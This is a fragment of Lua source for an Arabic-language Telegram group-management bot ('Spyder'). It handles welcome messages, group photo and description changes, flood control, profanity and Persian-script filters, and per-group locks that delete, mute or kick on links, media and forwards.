local GetWelcomeGroup = redis:get('Spyder:'..bot_id..'Get:Welcome:Group'..msg.chat_id_)  
if GetWelcomeGroup then 
t = GetWelcomeGroup
else  
t = '\n• نورت حبي \n•  name \n• user'
end 
t = t:gsub('name',result.first_name_) 
t = t:gsub('user',('@'..result.username_ or 'لا يوجد')) 
send(msg.chat_id_, msg.id_,t)
end,nil) 
end 
end 
if msg.content_.photo_ then  
if redis:get('Spyder:'..bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) then 
if msg.content_.photo_.sizes_[3] then  
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_ 
else 
photo_id = msg.content_.photo_.sizes_[0].photo_.persistent_id_ 
end 
tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
if data.code_ == 3 then
send(msg.chat_id_, msg.id_,'⌔︙ عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا') 
redis:del('Spyder:'..bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,'⌔︙ ليس لدي صلاحية تغيير معلومات المجموعه يرجى المحاوله لاحقا') 
redis:del('Spyder:'..bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
else
send(msg.chat_id_, msg.id_,'⌔︙ تم تغيير صورة المجموعه') 
end
end, nil) 
redis:del('Spyder:'..bot_id..'Change:Chat:Photo'..msg.chat_id_..':'..msg.sender_user_id_) 
end   
end
--------------------------------------------------------------------------------------------------------------
if redis:get('Spyder:'..bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"⌔︙ تم الغاء وضع الوصف") 
redis:del('Spyder:'..bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)
return false  
end 
redis:del('Spyder:'..bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
https.request('https://api.telegram.org/bot'..token..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
send(msg.chat_id_, msg.id_,'⌔︙ تم تغيير وصف المجموعه')   
return false  
end 
--------------------------------------------------------------------------------------------------------------
if redis:get('Spyder:'..bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"⌔︙ تم الغاء حفظ الترحيب") 
redis:del('Spyder:'..bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  
end 
redis:del('Spyder:'..bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
redis:set('Spyder:'..bot_id..'Get:Welcome:Group'..msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,'⌔︙ تم حفظ ترحيب المجموعه')   
return false   
end
--------------------------------------------------------------------------------------------------------------
if redis:get('Spyder:'..bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) then
if text == 'الغاء' then
send(msg.chat_id_,msg.id_,"⌔︙ تم الغاء حفظ الرابط")       
redis:del('Spyder:'..bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false
end
if text and text:match("(https://telegram.me/joinchat/%S+)") or text and text:match("(https://t.me/joinchat/%S+)") then     
local Link = text:match("(https://telegram.me/joinchat/%S+)") or text:match("(https://t.me/joinchat/%S+)")   
redis:set('Spyder:'..bot_id.."Private:Group:Link"..msg.chat_id_,Link)
send(msg.chat_id_,msg.id_,"⌔︙ تم حفظ الرابط بنجاح")       
redis:del('Spyder:'..bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end
end 
--------------------------------------------------------------------------------------------------------------
if text and not Vips(msg) then  
local Spyder_Msg = redis:get('Spyder:'..bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if Spyder_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⌔︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n⌔︙["..Spyder_Msg.."] \n") 
else
send(msg.chat_id_,0,"⌔︙العضو : {["..data.first_name_.."](T.ME/Spyder)}\n⌔︙["..Spyder_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end
end
--------------------------------------------------------------------------------------------------------------
if not Vips(msg) and msg.content_.ID ~= "MessageChatAddMembers" and redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"flood") then 
floods = redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"flood") or 'nil'
NUM_MSG_MAX = redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5
TIME_CHECK = redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 5
local post_count = tonumber(redis:get('Spyder:'..bot_id..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_) or 0)
if post_count > tonumber(redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") or 5) then 
local ch = msg.chat_id_
local type = redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"flood") 
trigger_anti_spam(msg,type)  
end
redis:setex('Spyder:'..bot_id..'floodc:'..msg.sender_user_id_..':'..msg.chat_id_, tonumber(redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") or 3), post_count+1) 
local edit_id = data.text_ or 'nil'  
NUM_MSG_MAX = 5
if redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") then
NUM_MSG_MAX = redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"floodmax") 
end
if redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") then
TIME_CHECK = redis:hget('Spyder:'..bot_id.."flooding:settings:"..msg.chat_id_,"floodtime") 
end 
end 
--------------------------------------------------------------------------------------------------------------
if text and redis:get('Spyder:'..bot_id..'lock:Fshar'..msg.chat_id_) and not Mod(msg) then 
list = {"كس","كسمك","كسختك","عير","كسخالتك","خرا بالله","عير بالله","كسخواتكم","كحاب","مناويج","مناويج","كحبه","ابن الكحبه","فرخ","فروخ","طيزك","طيزختك"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
------------------------------------------------------------
if text and redis:get('Spyder:'..bot_id..'lock:Iran'..msg.chat_id_) and not Mod(msg) then 
list = {"ڄ","که","پی","خسته","برم","راحتی","بیام","بپوشم","گرمه","چه","چ","ڬ","ٺ","چ","ڇ","ڿ","ڀ","ڎ","ݫ","ژ","ڟ","ݜ","ڸ","پ","۴","زدن","دخترا","دیوث","مک","زدن"}
for k,v in pairs(list) do
print(string.find(text,v))
if string.find(text,v) ~= nil then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
end
--------------------------------------------------------------------------------------------------------------
if redis:get('Spyder:'..bot_id..'lock:text'..msg.chat_id_) and not Vips(msg) then       
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false     
end     
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
redis:incr('Spyder:'..bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Vips(msg) then   
if redis:get('Spyder:'..bot_id.."lock:AddMempar"..msg.chat_id_) == 'kick' then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
Group_Kick(msg.chat_id_,mem_id[i].id_)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and not Vips(msg) then 
if redis:get('Spyder:'..bot_id.."lock:Join"..msg.chat_id_) == 'kick' then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
return false  
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
if redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Vips(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Vips(msg) then    
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
if redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) == "ked" and not Vips(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) == "kick" and not Vips(msg) then    
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:user:name"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if redis:get('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Vips(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Vips(msg) then    
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("#[%a%d_]+") or text and text:match("#(.+)") then
if redis:get('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_) == "ked" and not Vips(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_) == "kick" and not Vips(msg) then    
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:hashtak"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("/[%a%d_]+") or msg.content_.caption_:match("/(.+)") then  
if redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Vips(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Vips(msg) then    
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("/[%a%d_]+") or text and text:match("/(.+)") then
if redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) == "del" and not Vips(msg) then    
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) == "ked" and not Vips(msg) then    
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) == "kick" and not Vips(msg) then    
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Cmd"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if not Vips(msg) then 
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or msg.content_.caption_:match(".[Pp][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or msg.content_.caption_:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or msg.content_.caption_:match("[Tt].[Mm][Ee]/") then 
if redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) == "del" and not Vips(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Vips(msg) then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Vips(msg) then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) == "ktm" and not Vips(msg) then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]/") or text and text:match("[Hh][Tt][Tt][Pp][Ss]://") or text and text:match("[Hh][Tt][Tt][Pp]://") or text and text:match("[Ww][Ww][Ww].") or text and text:match(".[Cc][Oo][Mm]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]/") or text and text:match(".[Pp][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]/") or text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]/") or text and text:match("[Tt].[Mm][Ee]/") and not Vips(msg) then
if redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) == "del" and not Vips(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) == "ked" and not Vips(msg) then 
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) == "kick" and not Vips(msg) then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Link"..msg.chat_id_) == "ktm" and not Vips(msg) then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if tonumber(msg.via_bot_user_id_) ~= 0 and not Vips(msg) then
if redis:get('Spyder:'..bot_id.."Lock:Inlen"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."Lock:Inlen"..msg.chat_id_) == "ked" then
RestrictChat(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."Lock:Inlen"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."Lock:Inlen"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id.."Muted:User"..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end 

--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessagePhoto' and not Vips(msg) then     
if redis:get('Spyder:'..bot_id.."lock:Photo"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Photo"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Photo"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Photo"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageVideo' and not Vips(msg) then     
if redis:get('Spyder:'..bot_id.."lock:Video"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Video"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Video"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Video"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAnimation' and not Vips(msg) then     
if redis:get('Spyder:'..bot_id.."lock:Animation"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Animation"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Animation"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Animation"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.game_ and not Vips(msg) then     
if redis:get('Spyder:'..bot_id.."lock:geam"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:geam"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:geam"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:geam"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageAudio' and not Vips(msg) then     
if redis:get('Spyder:'..bot_id.."lock:Audio"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Audio"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Audio"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Audio"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageVoice' and not Vips(msg) then     
if redis:get('Spyder:'..bot_id.."lock:vico"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:vico"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:vico"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:vico"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.reply_markup_ and msg.reply_markup_.ID == 'ReplyMarkupInlineKeyboard' and not Vips(msg) then     
if redis:get('Spyder:'..bot_id.."lock:Keyboard"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Keyboard"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Keyboard"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Keyboard"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageSticker' and not Vips(msg) then     
if redis:get('Spyder:'..bot_id.."lock:Sticker"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Sticker"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Sticker"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Sticker"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.forward_info_ and not Vips(msg) then     
if redis:get('Spyder:'..bot_id.."lock:forward"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif redis:get('Spyder:'..bot_id.."lock:forward"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif redis:get('Spyder:'..bot_id.."lock:forward"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
elseif redis:get('Spyder:'..bot_id.."lock:forward"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
return false
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == 'MessageDocument' and not Vips(msg) then     
if redis:get('Spyder:'..bot_id.."lock:Document"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Document"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Document"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Document"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageUnsupported" and not Vips(msg) then      
if redis:get('Spyder:'..bot_id.."lock:Unsupported"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Unsupported"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Unsupported"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Unsupported"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.entities_ then 
if msg.content_.entities_[0] then 
if msg.content_.entities_[0] and msg.content_.entities_[0].ID == "MessageEntityUrl" or msg.content_.entities_[0].ID == "MessageEntityTextUrl" then      
if not Vips(msg) then
if redis:get('Spyder:'..bot_id.."lock:Markdaun"..msg.chat_id_) == "del" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Markdaun"..msg.chat_id_) == "ked" then
ked(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Markdaun"..msg.chat_id_) == "kick" then
Group_Kick(msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get('Spyder:'..bot_id.."lock:Markdaun"..msg.chat_id_) == "ktm" then
redis:sadd('Spyder:'..bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_}) 
end
end  
end 
end
end 
--------------------------------------------------------------------------------------------------------------
